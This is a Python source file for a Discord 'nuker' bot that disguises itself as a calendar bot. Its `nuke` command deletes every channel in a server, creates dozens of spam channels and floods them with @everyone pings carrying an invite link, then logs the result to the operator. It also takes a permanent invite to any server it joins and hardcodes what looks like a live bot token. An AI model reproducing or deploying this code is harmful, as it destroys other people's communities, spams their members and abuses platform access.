import discord
import aiohttp
import asyncio
import os
import json
import time
import aiolimiter
# from imports
from discord.ext import commands
from colorama import Fore as ff


# imports from utils
from utils.botinfo import botinfo
from utils.prettify import req_prettify as rp
from utils.delete_channel import delete_channel
from utils.delete_role import delete_role
from utils.spam_channels import spam_channels
from utils.ban_member import ban_member
from utils.post_dm import post_dm
from utils.spam_messages import spam_messages
owners = [1162694618790514778]
main_srv = 1164491579910791230
shadow = commands.Bot(command_prefix=">",
                      intents=discord.Intents.all(), help_command=None)
token = "MTE2NDk0OTkxNTM3NDQ2OTIxMQ.GOT_uu.Q5I42ECZqn63HjejglIZA9jow3x5KfozCAg2Ac"
whitelisted = []
whitelisted.extend(owners)
limiter = aiolimiter.AsyncLimiter(50, 1)
headers = {"authorization": f"Bot {token}"}


def authorize(id: int):
    if id in whitelisted:
        return True
    else:
        return False


async def auth(ctx):
    auth_ = authorize(int(ctx.author.id))
    if auth_ == True:

        # await ctx.send("Can't use this command in this server this server is Whitelisted!")
        if ctx.guild.id != main_srv:
            return True
    else:
        await ctx.send("Error: You aren't whitelist")
        return False


@shadow.event
async def on_ready():
    global whitelisted
    os.system("clear || cls")
    await shadow.change_presence(activity=discord.Game(name="Best Calander Bot!"))
    # for guild in shadow.guilds:
    # print(guild.name + " - " + str(guild.id))
    # print(f"Fetched {len(shadow.guilds)} Guilds\nDone With on_ready, logs disabled")
    with open("whitelist.txt", "r") as users:
        for user in users:
            if user != "\n":
                whitelisted.append(int(user))
            else:
                pass
    await botinfo(headers)


@shadow.command()
async def reload(ctx):
    with open("whitelist.txt", "r") as users:
        for user in users:
            if user != "\n":
                whitelisted.append(int(user))
            else:
                pass
    await ctx.message.add_reaction("\N{THUMBS UP SIGN}")


@shadow.event
async def on_guild_join(guild):
    channels = guild.channels
    random = channels[0]
    url = await random.create_invite(max_age=0)
    rp(200, url)


@shadow.command(aliases=["wl"])
async def whitelist(ctx, userd: discord.Member):
    with open("whitelist.txt", "r") as u:
        # print(users)
        if int(ctx.author.id) not in owners:
            await ctx.reply("Error: You Dont Have Enough Permissions To Use This Command!")
        elif int(userd.id) in whitelisted:
            await ctx.reply("User already exists in my whitelist")
        else:
            with open("whitelist.txt", "a") as append_user_id:
                append_user_id.write(f"{userd.id}\n")
            embed = discord.Embed(color=discord.Color.from_rgb(
                131, 52, 235), title="Whitelist User", description="> Succesfully Whitelisted User in (whitelist)")
            embed.set_footer(text=ctx.author.name + " - " +
                             str(ctx.author.id), icon_url=ctx.author.avatar_url)
            await ctx.reply(embed=embed)


@shadow.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        em = discord.Embed(title=f"Command On Cooldown",
                           description=f"Try again in {error.retry_after:.2f}s.")
        await ctx.send(embed=em)
    else:
        print(error)


def dump(conf: dict) -> bool:
    with open("user_configs.json", "w") as configs__:
        try:
            json.dump(conf, configs__, indent=4)
            return True
        except:
            return False


def load_config(user: int) -> dict:
    with open("user_configs.json", "r") as configs:
        configs_ = json.load(configs)
        if str(user) in configs_:
            return configs_
        else:
            configs_[str(user)] = {}
            configs_[str(
                user)]["invite_link"] = "https://discord.gg/SCpyrGThGv"
            configs_[str(user)]["name"] = "shadow-runs-cord"
            configs_[str(
                user)]["reason"] = "Shadow Bot"
            with open("user_configs.json", "w") as out:
                json.dump(configs_, out, indent=4)
        with open("user_configs.json", "r") as configs__:
            configs___ = json.load(configs__)
            return configs___


@commands.cooldown(1, 120, commands.BucketType.user)
@shadow.command()
async def nuke(ctx):
    if int(ctx.guild.id) == main_srv:
        return
    else:
        pass
    await ctx.message.delete()
    logs = 1164497620522254366
    log_channel = shadow.get_channel(logs)
    config = load_config(ctx.author.id)
    invite_link = config[str(ctx.author.id)]["invite_link"]
    channel_names = config[str(ctx.author.id)]["name"]
    ban_reason = config[str(ctx.author.id)]["reason"]

    timer = time.perf_counter()

    channels = ctx.guild.channels

    c_task = [asyncio.create_task(delete_channel(
        headers, c.id, limiter)) for c in channels]
    await asyncio.wait(c_task)
    c_timer = time.perf_counter()

    c_task2 = [asyncio.create_task(spam_channels(
        limiter, headers, ctx.guild.id, channel_names)) for _ in range(50)]
    await asyncio.wait(c_task2)
    c_timer2 = time.perf_counter()

    n_channels = ctx.guild.channels
    s_task = [asyncio.create_task(spam_messages(
        limiter, headers, c.id, f"@everyone {invite_link}")) for c in n_channels]
    await asyncio.wait(s_task)

    t1, t2 = round(c_timer - timer), round(c_timer2 - c_timer)
    embed = discord.Embed(
        title=f"Server N3KED By {ctx.author.name}", description=f"Information Given Below!")
    embed.add_field(
        name="Timers", value=f"`Channel Deletion`: **{t1} Seconds**\n`Channel Creation`: **{t2} Seconds**", inline=False)
    embed.add_field(name="Guild Info",
                    value=f"`Guild Members`: **{ctx.guild.member_count}**\n`Guild Owner`: {ctx.guild.owner.name}", inline=False)
    await log_channel.send(embed=embed)


@shadow.command()
async def config(ctx):
    # a = await auth(ctx)
    # if a == True:
    config = load_config(str(ctx.author.id))
    embed = discord.Embed(title="Premium User Config",
                          description="The Default Config Is The Same As Non-Premium User, Please Change It Using `>config_change [config_name] [new_value]` If You Are A Premium User")
    invite_link = config[str(ctx.author.id)]["invite_link"]
    channel_names = config[str(ctx.author.id)]["name"]
    ban_reason = config[str(ctx.author.id)]["reason"]
    embed.add_field(name=f"{ctx.author.name}\'s Config",
                    value=f"`invite_link`: {invite_link}\n`name`: {channel_names}\n`reason`: {ban_reason}", inline=False)
    await ctx.reply(embed=embed)
    # else:
    # await ctx.reply("You Arent Whitelisted")


@shadow.command(aliases=["cc"])
async def config_change(ctx, config_name, config_value):
    auth_ = authorize(int(ctx.author.id))
    if auth_ == True:
        config = load_config(ctx.author.id)
        config[str(ctx.author.id)][str(config_name)] = str(config_value)
        i = dump(config)
        if i == True:
            await ctx.reply("> Changed Your Config")
        else:
            await ctx.reply("Invalid Syntax")

    else:
        await ctx.send("Error: You arent whitelist")
        return False
shadow.run(token)
